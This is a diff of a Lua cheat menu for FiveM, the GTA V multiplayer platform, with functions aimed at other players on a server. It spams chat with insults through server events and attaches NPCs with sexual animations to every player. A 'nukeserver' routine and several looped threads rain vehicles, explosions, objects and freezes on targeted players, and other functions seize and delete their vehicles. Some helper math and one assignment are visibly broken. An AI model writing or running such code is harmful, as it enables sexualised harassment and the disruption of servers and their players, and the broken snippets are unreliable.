+            if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
+                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
+                while not NetworkHasControlOfEntity(veh) do
+                    NetworkRequestControlOfEntity(veh)
+                    Citizen.Wait(0)
+                end
+                SetEntityAsMissionEntity(veh, true, true)
+                DeleteVehicle(veh)
+                DeleteEntity(veh)
+            end
+            count = -0.2
+            for b = 1, 3 do
+                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
+                local bz = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
+                SetEntityAsMissionEntity(bz, true, true)
+                AttachEntityToEntity(
+                    bz,
+                    GetPlayerPed(SelectedPlayer),
+                    4103,
+                    11816,
+                    count,
+                    0.00,
+                    0.0,
+                    0.0,
+                    0.0,
+                    0.0,
+                    false,
+                    false,
+                    false,
+                    false,
+                    2,
+                    true
+                )
+                ClearPedTasks(GetPlayerPed(SelectedPlayer))
+                TaskPlayAnim(
+                    GetPlayerPed(SelectedPlayer),
+                    'rcmpaparazzo_2',
+                    'shag_loop_poppy',
+                    2.0,
+                    2.5,
+                    -1,
+                    49,
+                    0,
+                    0,
+                    0,
+                    0
+                )
+                SetPedKeepTask(bz)
+                TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
+                SetEntityInvincible(bz, true)
+                count = count - 0.4
+            end
+        end
+    )
+end
+
+function CreateDeer()
+	local Model = GetHashKey("a_c_deer")
+	RequestModel(Model)
+	while not HasModelLoaded(Model) do
+		Citizen.Wait(50)
+	end
+
+	local Ped = PlayerPedId()
+	local PedPosition = GetEntityCoords(Ped, false)
+
+	Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
+
+	SetPedCanRagdoll(Handle, Animal.Ragdoll)
+	SetEntityInvincible(Handle, Animal.Invincible)
+    SetPedDefaultComponentVariation(Handle)
+	SetModelAsNoLongerNeeded(Model)
+end
+
+function RapeAllFunc()
+    for bs=0,9 do
+        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"You just got fucked mate")
+    end
+    Citizen.CreateThread(function()
+        for i=0,128 do
+            RequestModelSync("a_m_o_acult_01")
+            RequestAnimDict("rcmpaparazzo_2")
+            while not HasAnimDictLoaded("rcmpaparazzo_2")do
+                Citizen.Wait(0)
+            end
+            if IsPedInAnyVehicle(GetPlayerPed(i),true)then
+                local veh=GetVehiclePedIsIn(GetPlayerPed(i),true)
+                while not NetworkHasControlOfEntity(veh)do
+                    NetworkRequestControlOfEntity(veh)
+                    Citizen.Wait(0)
+                end
+                SetEntityAsMissionEntity(veh,true,true)
+                DeleteVehicle(veh)DeleteEntity(veh)end
+                count=-0.2
+                for b=1,3 do
+                    local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),true))
+                    local bD=CreatePed(4,GetHashKey("a_m_o_acult_01"),x,y,z,0.0,true,false)
+                    SetEntityAsMissionEntity(bD,true,true)
+                    AttachEntityToEntity(bD,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,false,false,false,false,2,true)
+                    ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),"rcmpaparazzo_2","shag_loop_poppy",2.0,2.5,-1,49,0,0,0,0)
+                    SetPedKeepTask(bD)TaskPlayAnim(bD,"rcmpaparazzo_2","shag_loop_a",2.0,2.5,-1,49,0,0,0,0)
+                    SetEntityInvincible(bD,true)count=count-0.4
+            end
+        end
+    end)
+end
+
+function teleportToNearestVehicle()
+            local playerPed = GetPlayerPed(-1)
+            local playerPedPos = GetEntityCoords(playerPed, true)
+            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
+            local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
+            local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
+            local NearestPlanePos = GetEntityCoords(NearestPlane, true)
+        drawNotification("~y~Wait...")
+        Citizen.Wait(1000)
+        if (NearestVehicle == 0) and (NearestPlane == 0) then
+            drawNotification("~r~No Vehicle Found")
+        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
+            if IsVehicleSeatFree(NearestPlane, -1) then
+                SetPedIntoVehicle(playerPed, NearestPlane, -1)
+                SetVehicleAlarm(NearestPlane, false)
+                SetVehicleDoorsLocked(NearestPlane, 1)
+                SetVehicleNeedsToBeHotwired(NearestPlane, false)
+            else
+                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
+                ClearPedTasksImmediately(driverPed)
+                SetEntityAsMissionEntity(driverPed, 1, 1)
+                DeleteEntity(driverPed)
+                SetPedIntoVehicle(playerPed, NearestPlane, -1)
+                SetVehicleAlarm(NearestPlane, false)
+                SetVehicleDoorsLocked(NearestPlane, 1)
+                SetVehicleNeedsToBeHotwired(NearestPlane, false)
+            end
+            drawNotification("~g~Teleported Into Nearest Vehicle!")
+        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
+            if IsVehicleSeatFree(NearestVehicle, -1) then
+                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
+                SetVehicleAlarm(NearestVehicle, false)
+                SetVehicleDoorsLocked(NearestVehicle, 1)
+                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
+            else
+                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
+                ClearPedTasksImmediately(driverPed)
+                SetEntityAsMissionEntity(driverPed, 1, 1)
+                DeleteEntity(driverPed)
+                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
+                SetVehicleAlarm(NearestVehicle, false)
+                SetVehicleDoorsLocked(NearestVehicle, 1)
+                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
+            end
+            drawNotification("~g~Teleported Into Nearest Vehicle!")
+        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
+            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
+                if IsVehicleSeatFree(NearestVehicle, -1) then
+                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
+                    SetVehicleAlarm(NearestVehicle, false)
+                    SetVehicleDoorsLocked(NearestVehicle, 1)
+                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
+                else
+                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
+                    ClearPedTasksImmediately(driverPed)
+                    SetEntityAsMissionEntity(driverPed, 1, 1)
+                    DeleteEntity(driverPed)
+                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
+                    SetVehicleAlarm(NearestVehicle, false)
+                    SetVehicleDoorsLocked(NearestVehicle, 1)
+                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
+                end
+            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
+                if IsVehicleSeatFree(NearestPlane, -1) then
+                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
+                    SetVehicleAlarm(NearestPlane, false)
+                    SetVehicleDoorsLocked(NearestPlane, 1)
+                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
+                else
+                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
+                    ClearPedTasksImmediately(driverPed)
+                    SetEntityAsMissionEntity(driverPed, 1, 1)
+                    DeleteEntity(driverPed)
+                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
+                    SetVehicleAlarm(NearestPlane, false)
+                    SetVehicleDoorsLocked(NearestPlane, 1)
+                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
+                end
+            end
+            drawNotification("~g~Teleported Into Nearest Vehicle!")
+        end
+
+    end
+
+
+
+	local function d(e)
+    local f = {}
+    local h = GetGameTimer() / 200
+    f.r = math.floor(math.sin(h * e + 0) * 127 + 128)
+    f.g = math.floor(math.sin(h * e + 2) * 127 + 128)
+    f.b = math.floor(math.sin(h * e + 4) * 127 + 128)
+    return f
+end
+	
+local cL = true
 local cM = false
 local cN = true
-local cO = false
-
---blip
+local cO = true
 Citizen.CreateThread(
     function()
         while true do
             Wait(1)
             for f = 0, 128 do
                 if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
-                    ped = GetPlayerPed(f)
+                   local ped = GetPlayerPed(f)
                     blip = GetBlipFromEntity(ped)
                     x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                     x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
@@ -6709,1486 +4316,271 @@ Citizen.CreateThread(
         end
     end
 )
----
-local cP = {
-    __gc = function(cQ)
-        if cQ.destructor and cQ.handle then
-            cQ.destructor(cQ.handle)
-        end
-        cQ.destructor = nil
-        cQ.handle = nil
-    end
-}
 
-function EnumerateEntities(cR, cS, cT)
-    return coroutine.wrap(
-        function()
-            local cU, f = cR()
-            if not f or f == 0 then
-                cT(cU)
-                return
-            end
-            local cQ = {
-                handle = cU,
-                destructor = cT
-            }
-            setmetatable(cQ, cP)
-            local cV = true
-            repeat
-                coroutine.yield(f)
-                cV, f = cS(cU)
-            until not cV
-            cQ.destructor, cQ.handle = nil, nil
-            cT(cU)
-        end
-    )
+function ShootPlayer(player)
+    local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
+    SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
 end
 
 
-
-
-function RotationToDirection(cW)
-    local cX = cW.z * 0.0174532924
-    local cY = cW.x * 0.0174532924
-    local cZ = math.abs(math.cos(cY))
-    return vector3(-math.sin(cX) * cZ, math.cos(cX) * cZ, math.sin(cY))
+function SpawnObjOnPlayer(modelHash)
+    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
+    local obj CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
+        if attachProp then
+            AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true ,true ,false, true, 1, true)
+        end
 end
 
-function OscillateEntity(entity, c_, d0, d1, d2)
-    if entity ~= 0 and entity ~= nil then
-        local d3 = (d0 - c_) * d1 * d1 - 2.0 * d1 * d2 * GetEntityVelocity(entity)
-        ApplyForceToEntity(entity, 3, d3.x, d3.y, d3.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
+function nukeserver()
+    Citizen.CreateThread(function()
+        local dg="Avenger"
+        local dh="CARGOPLANE"
+        local di="luxor"
+        local dj="maverick"
+        local dk="blimp2"
+
+        while not HasModelLoaded(GetHashKey(dh))do
+            Citizen.Wait(0)
+            RequestModel(GetHashKey(dh))
+        end
+
+        while not HasModelLoaded(GetHashKey(di))do
+            Citizen.Wait(0)RequestModel(GetHashKey(di))
+        end
+
+        while not HasModelLoaded(GetHashKey(dg))do
+            Citizen.Wait(0)RequestModel(GetHashKey(dg))
+        end
+
+        while not HasModelLoaded(GetHashKey(dj))do
+            Citizen.Wait(0)RequestModel(GetHashKey(dj))
+        end
+
+        while not HasModelLoaded(GetHashKey(dk))do
+            Citizen.Wait(0)RequestModel(GetHashKey(dk))
+        end
+
+        for bs=0,9 do
+            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Brutan Premium")
+        end
+
+        for i=0,128 do
+            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
+        end
+     end)
+    end
+
+function rotDirection(rot)
+    local radianz = rot.z * 0.0174532924
+    local radianx = rot.x * 0.0174532924
+    local num = math.abs(math.cos(radianx))
+
+    local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))
+
+    return dir
+end
+
+function GetDistance(pointA, pointB)
+
+    local aX = pointA.x
+    local aY = pointA.y
+    local aZ = pointA.z
+
+    local bX = pointB.x
+    local bY = pointB.y
+    local bZ = pointB.z
+
+    local xBA = bX - aX
+    local yBA = bY - aY
+    local zBA = bZ - aZ
+
+    local y2 = yBA * yBA
+    local x2 =  xBA * xBA
+    local sum2 = y2 + x2
+
+    return math.sqrt(sum2 + zBA)
+end
+
+function getPosition()
+  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
+  return x,y,z
+end
+
+function getCamDirection()
+  local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
+  local pitch = GetGameplayCamRelativePitch()
+
+  local x = -math.sin(heading*math.pi/180.0)
+  local y = math.cos(heading*math.pi/180.0)
+  local z = math.sin(pitch*math.pi/180.0)
+
+  local len = math.sqrt(x*x+y*y+z*z)
+  if len ~= 0 then
+    x = x/len
+    y = y/len
+    z = z/len
+  end
+
+  return x,y,z
+end
+
+function RotToDirection(rot)
+    local radiansZ = rot.z * 0.0174532924
+    local radiansX = rot.x * 0.0174532924
+    local num = math.abs(math.cos(radiansX))
+    local dir = vector3(-math.sin(radiansZ) * num, math.cos(radiansZ * num), math.sin(radiansX))
+    return dir
+end
+
+function add(a, b)
+    local result = vector3(a.x + b.x, a.y + b.y, a.z + b.z)
+
+    return result
+end
+
+function multiply(coords, coordz)
+    local result = vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz)
+
+    return result
+end
+
+function SpectatePlayer(player)
+    local playerPed = PlayerPedId()
+    Spectating = not Spectating
+    local targetPed = GetPlayerPed(player)
+
+    if (Spectating) then
+        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
+
+        RequestCollisionAtCoord(targetx, targety, targetz)
+        NetworkSetInSpectatorMode(true, targetPed)
+
+        drawNotification("~r~Spectating " .. GetPlayerName(player))
+    else
+        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
+
+        RequestCollisionAtCoord(targetx, targety, targetz)
+        NetworkSetInSpectatorMode(false, targetPed)
+
+        drawNotification("~r~Stopped Spectating " .. GetPlayerName(player))
     end
 end
-Citizen.CreateThread(function()
-    while true do
-        local second = 1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if active then
-                         local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-						AddExplosion (Pos.x, Pos.y, Pos.z, EXPLOSION_PROGRAMMABLEAR, 99, false, false, 0.0) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z, EXPLOSION_PROPANE, 99, false, false, 0.0)
-						AddExplosion (Pos.x, Pos.y, Pos.z + 1, EXPLOSION_PROGRAMMABLEAR, 99, false, false, 0.0) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z + 0.5, EXPLOSION_PROPANE, 99, false, false, 0.0)
-						AddExplosion (Pos.x, Pos.y, Pos.z + 1.1, EXPLOSION_PROGRAMMABLEAR, 99, false, false, 0.0) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z + 0.7, EXPLOSION_PROPANE, 99, false, false, 0.0)  						
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if active1 then
-                         local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-                        AddExplosion (Pos.x, Pos.y, Pos.z + 1.2, 29, 0.0, false, false, 0.0)
-                        AddExplosion (Pos.x, Pos.y, Pos.z + 3, 29, 0.0, false, false, 0.0)
-                        AddExplosion (Pos.x - 0.1, Pos.y, Pos.z + 0.6, 29, 0.0, false, false, 0.0)   						
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 700
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if mysound then
-                         local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId)) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z - 2, 13, 99, false, false, 0.0) 					
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 700
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if bossmode then
-                         local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId)) 
-                        AddExplosion (Pos.x - 5, Pos.y + 9, Pos.z + 3, 10, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x + 5, Pos.y - 9, Pos.z + 3, 10, 5.0, false, false, 0.0)	
-                        AddExplosion (Pos.x - 9, Pos.y + 11, Pos.z + 3, 10, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x + 9, Pos.y - 11, Pos.z + 3, 10, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x - 13, Pos.y + 13, Pos.z + 3, 10, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x + 13, Pos.y - 13, Pos.z + 3, 10, 5.0, false, false, 0.0)	
-                        AddExplosion (Pos.x - 16, Pos.y + 6, Pos.z + 3, 10, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x + 16, Pos.y - 6, Pos.z + 3, 10, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x - 20, Pos.y + 16, Pos.z + 3, 10, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x + 20, Pos.y - 16, Pos.z + 3, 10, 5.0, false, false, 0.0)												
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 700
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if Boggyman then
-                         local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId)) 
-                         AddExplosion (Pos.x, Pos.y, Pos.z, 11, 5.0, false, true, 0.0)					
-        end
-    end
-end)						
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if smoke1 then
-                        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-                        AddExplosion (Pos.x, Pos.y, Pos.z, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x + 1, Pos.y, Pos.z - 1, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x, Pos.y + 1, Pos.z - 1, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x, Pos.y - 1, Pos.z - 1, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x - 1.5, Pos.y, Pos.z - 1, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x, Pos.y - 0.5, Pos.z - 1, 24, 5.0, false, false, 0.0)			
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 400
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if bird1 then
-		         local ped1 = GetPlayerPed(selectedPlayerId)
-				 local Dildo = GetEntityCoords(ped1)
-				local bH1 = CreateObject(GetHashKey('apa_prop_flag_us_yt'), Dildo.x, Dildo.y, Dildo.z + 0.6, true, true, true)	
-				NetworkRequestControlOfEntity(bH1)
-				SlideObject (bH1, 0, 0, 9999, 0, 0, 9999, false)			
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 1000
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test8 then
-		      RequestModelSync('u_m_y_babyd')
-		         local ped1 = GetPlayerPed(selectedPlayerId)
-				 local oS = GetEntityCoords(ped1)
-				local bH1 = CreateObject(GetHashKey('Pbus2'), oS.x + 7, oS.y + 15, oS.z + 5.3, true, true, true)	
-				local bH2 = CreateObject(GetHashKey('futo'), oS.x + 1, oS.y - 12, oS.z + 5, true, true, true)	
-				local bH3 = CreateObject(GetHashKey('Ardent'), oS.x - 1, oS.y + 11, oS.z + 5, true, true, true)	
-				local bH4 = CreateObject(GetHashKey('BType'), oS.x + 2, oS.y - 10, oS.z + 5, true, true, true)	
-				local bH5 = CreateObject(GetHashKey('BType3'), oS.x + 3, oS.y + 9, oS.z + 5, true, true, true)	
-				local bH6 = CreateObject(GetHashKey('Cheetah2'), oS.x - 4, oS.y - 5, oS.z + 5, true, true, true)	
-				local bH7 = CreateObject(GetHashKey('Coquette2'), oS.x + 6, oS.y + 6, oS.z + 5, true, true, true)	
-				local bH8 = CreateObject(GetHashKey('Deluxo'), oS.x - 7, oS.y - 4, oS.z + 5, true, true, true)	
-				local bH9 = CreateObject(GetHashKey('Pbus2'), oS.x + 10, oS.y + 4, oS.z + 5, true, true, true)	
-				local bH10 = CreateObject(GetHashKey('Ardent'), oS.x - 15, oS.y - 3, oS.z + 5, true, true, true)	
-				local bH11 = CreateObject(GetHashKey('Coquette3'), oS.x, oS.y + 2, oS.z + 5, true, true, true)								
-				
-        end
-    end
-end)
 
-Citizen.CreateThread(function()
-    while true do
-        local second = 1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if test007 then
-                    local veh = ("futo")
-					local target = GetPlayerPed(selectedPlayerId)
-                    local pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-                    local xf = GetEntityForwardX(GetPlayerPed(selectedPlayerId))
-                    local yf = GetEntityForwardY(GetPlayerPed(selectedPlayerId))
-					local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayerId), 0, 0.0, 0)
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('s_f_y_bartender_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('s_f_y_bartender_01') do
-                        RequestModel('s_f_y_bartender_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        local v = CreateVehicle(veh, offset.x, offset.y, offset.z, GetEntityHeading(target), true, true)
-						SetEntityVisible(v, false, true)
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('s_f_y_bartender_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('s_f_y_bartender_01') then
-                            Citizen.Wait(50)
-							SetVehicleForwardSpeed(v, 1.0)
-                            end
-                        end
-                    end
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 10
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if freeze2 then
-		 local player = PlayerPedId(selectedPlayerId)
-		  ClearPedTasksImmediately(GetPlayerPed(selectedPlayerId))
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 1500
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if freezeV1 then
-					local target = PlayerPedId(selectedPlayerId)
-                    local pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-                    local xf = GetEntityForwardX(GetPlayerPed(selectedPlayerId))
-                    local yf = GetEntityForwardY(GetPlayerPed(selectedPlayerId))
-					local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayerId), 0, 0, -0.4)
-                    RequestModel('v_ilev_bk_vaultdoor')
-                    while not HasModelLoaded('v_ilev_bk_vaultdoor') do
-                        RequestModel('v_ilev_bk_vaultdoor')
-                        Citizen.Wait(0)
-                    end
-                    if HasModelLoaded('v_ilev_bk_vaultdoor') then
-						local v = CreateObject(GetHashKey('v_ilev_bk_vaultdoor'), offset.x - 0.4, offset.y - 2, offset.z, true, true, true)
-						local v1 = CreateObject(GetHashKey('v_ilev_bk_vaultdoor'), offset.x - 1.5, offset.y - 2, offset.z, true, true, true)
-						local v2 = CreateObject(GetHashKey('v_ilev_bk_vaultdoor'), offset.x - 1.5, offset.y + 0.6, offset.z, true, true, true)
-						local v3 = CreateObject(GetHashKey('v_ilev_bk_vaultdoor'), offset.x + 0.7, offset.y - 2, offset.z, true, true, true)
-						local v4 = CreateObject(GetHashKey('v_ilev_bk_vaultdoor'), offset.x + 1, offset.y - 2, offset.z, true, true, true)
-                        SetEntityHeading(v, 90.0)
-                        FreezeEntityPosition(v, true)
-                        SetEntityHeading(v3, 90.0)						
-					FreezeEntityPosition(v3, true)	
-                        SetEntityHeading(v4, 90.0)
-                        FreezeEntityPosition(v4, true)						
-                        FreezeEntityPosition(v1, true)
-                        FreezeEntityPosition(v2, true)
-                        SetEntityVisible(v, false, true)
-                        SetEntityVisible(v1, false, true)
-						SetEntityVisible(v2, false, true)
-						SetEntityVisible(v3, false, true)
-						SetEntityVisible(v4, false, true)
-					end	
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 1000
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if TEST20 then
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 0.1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if TEST22 then
-		            local veh = ("CargoPlane")
-					local target = PlayerPedId(selectedPlayerId)
-                    local pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-                    RequestModel(veh)
-                    while not HasModelLoaded(veh) do
-                        RequestModel(veh)
-                        Citizen.Wait(0)
-                    end
-                    if HasModelLoaded(veh) then
-						local v = CreateVehicle(veh, pos.x, pos.y, pos.z - 2, GetEntityHeading(target), true, true)
-						NetworkRequestControlOfEntity(v)
-                        SetEntityVisible(v, false, true)
-                        FreezeEntityPosition(v, true)
-						Citizen.Wait(1)
-						DeleteVehicle(v)
-					end	
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 0.1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if TEST30 then
-		            local veh = ("CargoPlane")
-					local target = PlayerPedId(-1)
-                    local pos = GetEntityCoords(GetPlayerPed(-1))
-                    RequestModel(veh)
-                    while not HasModelLoaded(veh) do
-                        RequestModel(veh)
-                        Citizen.Wait(0)
-                    end
-                    if HasModelLoaded(veh) then
-						local v = CreateVehicle(veh, pos.x, pos.y, pos.z - 50, GetEntityHeading(target), true, true)
-                        SetEntityVisible(v, false, true)
-					end	
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 0.1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if TEST31 then
-		            local veh = ("Tug")
-					local target = PlayerPedId(selectedPlayerId)
-                    local pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))
-                    RequestModel(veh)
-                    while not HasModelLoaded(veh) do
-                        RequestModel(veh)
-                        Citizen.Wait(0)
-                    end
-                    if HasModelLoaded(veh) then
-						local v = CreateVehicle(veh, pos.x, pos.y, pos.z, GetEntityHeading(target), true, true)
-						NetworkRequestControlOfEntity(v)
-                        SetEntityVisible(v, false, true)
-                        FreezeEntityPosition(v, true)
-						Citizen.Wait(1)
-						DeleteVehicle(v)
-					end	
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 1
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if INV3 then
-		    SetPedSuffersCriticalHits(PlayerPedId(-1), false)
-            SetEntityHealth(PlayerPedId(-1), 200)
-        end
-    end
-end)					
-Citizen.CreateThread(function()
-    while true do
-        local second = 1005
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if forcefield then
-                        local Pos = GetEntityCoords(GetPlayerPed(selectedPlayerId))	
-                        local ped1 = GetPlayerPed(selectedPlayerId)						
-                        AddExplosion (Pos.x, Pos.y, Pos.z, 30, 5.0, false, true, 0.0)						
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 2
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if manypeds then		
-					   local eU = "s_f_y_bartender_01"
-                                    local cM = GetEntityCoords(GetPlayerPed(selectedPlayerId)) 
-                                    RequestModel(GetHashKey(eU)) 
-                                    Citizen.Wait(0) 
-                                        if HasModelLoaded(GetHashKey(eU)) then 
-                                            local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z - 1, 0, true, true) NetworkRegisterEntityAsNetworked(ped)
-											Citizen.Wait(1) 
-                                            DeletePed(ped)											
-                                        end		
-        end
-    end
-end)
-Citizen.CreateThread(function()
-    while true do
-        local second = 100
-        Citizen.Wait(second) -- This sends a notification every 1 second.
-        if manypeds1 then
-		         local ped1 = GetPlayerPed(selectedPlayerId)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2)  
